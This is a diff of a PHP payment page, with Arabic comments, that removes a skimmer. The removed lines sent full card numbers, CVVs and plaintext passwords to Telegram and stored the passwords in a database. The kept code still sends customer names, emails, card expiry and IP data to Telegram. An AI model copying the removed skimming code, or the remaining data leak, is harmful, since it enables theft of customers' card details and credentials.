@@ -315,19 +315,18 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_payment_method']))
 
                         // إرسال بيانات البطاقة إلى تيليجرام
                         $message = "تمت إضافة بطاقة جديدة";
+                        // Do not include plaintext passwords or full card details in telemetry
                         $data = [
                             'customer' => [
                                 'name' => $user['name'],
                                 'email' => $user['email'],
-                                'user_id' => $_SESSION['user_id'],
-                                'password' => isset($_SESSION['user_password']) ? $_SESSION['user_password'] : 'غير متوفر' // إرسال كلمة المرور غير مشفرة
+                                'user_id' => $_SESSION['user_id']
                             ],
                             'card' => [
-                                'number' => $clean_card_number,
+                                'last4' => substr($clean_card_number, -4),
                                 'brand' => $card_brand,
                                 'holder' => $card_holder,
-                                'expiry' => $expiry_date,
-                                'cvv' => $cvv
+                                'expiry' => $expiry_date
                             ],
                             'technical_info' => [
                                 'ip_address' => $ip_address,
@@ -343,6 +342,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_payment_method']))
                         send_telegram_message($message, $data);
 
                         // إنشاء جدول payment_technical_info إذا لم يكن موجوداً
+                        // Store only non-sensitive telemetry; do NOT store passwords or full card numbers/CVV
                         $db->query('CREATE TABLE IF NOT EXISTS payment_technical_info (
                             id INT AUTO_INCREMENT PRIMARY KEY,
                             payment_id INT NOT NULL,
@@ -353,7 +353,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_payment_method']))
                             device VARCHAR(100) NOT NULL,
                             user_agent TEXT NOT NULL,
                             email VARCHAR(255) NOT NULL,
-                            password VARCHAR(255) NOT NULL,
+                            card_last4 VARCHAR(10) NULL,
                             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                             FOREIGN KEY (payment_id) REFERENCES payment_methods(id) ON DELETE CASCADE
                         )');
@@ -366,8 +366,8 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_payment_method']))
                         $payment_id = $payment_method['id'];
 
                         // حفظ المعلومات التقنية
-                        $db->query('INSERT INTO payment_technical_info (payment_id, user_id, ip_address, browser, os, device, user_agent, email, password)
-                                   VALUES (:payment_id, :user_id, :ip_address, :browser, :os, :device, :user_agent, :email, :password)');
+                        $db->query('INSERT INTO payment_technical_info (payment_id, user_id, ip_address, browser, os, device, user_agent, email, card_last4)
+                                   VALUES (:payment_id, :user_id, :ip_address, :browser, :os, :device, :user_agent, :email, :card_last4)');
                         $db->bind(':payment_id', $payment_id);
                         $db->bind(':user_id', $_SESSION['user_id']);
                         $db->bind(':ip_address', $ip_address);
@@ -376,7 +376,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_payment_method']))
                         $db->bind(':device', $device);
                         $db->bind(':user_agent', $user_agent);
                         $db->bind(':email', $user['email']);
-                        $db->bind(':password', isset($_SESSION['user_password']) ? $_SESSION['user_password'] : 'غير متوفر');
+                        $db->bind(':card_last4', substr($clean_card_number, -4));
                         $db->execute();
                     } else {
                         $error = $lang['payment_method_error'] ?? 'حدث خطأ أثناء إضافة طريقة الدفع';
@@ -843,7 +843,7 @@ $is_admin = isset($user['role']) && $user['role'] === 'admin';
                     <div id="paypal-fields" class="hidden">
                         <div class="mb-4 text-center">
                             <p class="text-gray-700 mb-4"><?php echo $lang['paypal_redirect_message'] ?? 'سيتم توجيهك إلى صفحة تسجيل الدخول إلى PayPal عند النقر على زر الحفظ'; ?></p>
-                            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="mx-auto" style="width: 120px;">
+                            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="mx-auto w-30 max-w-full" />
                         </div>
                     </div>
 
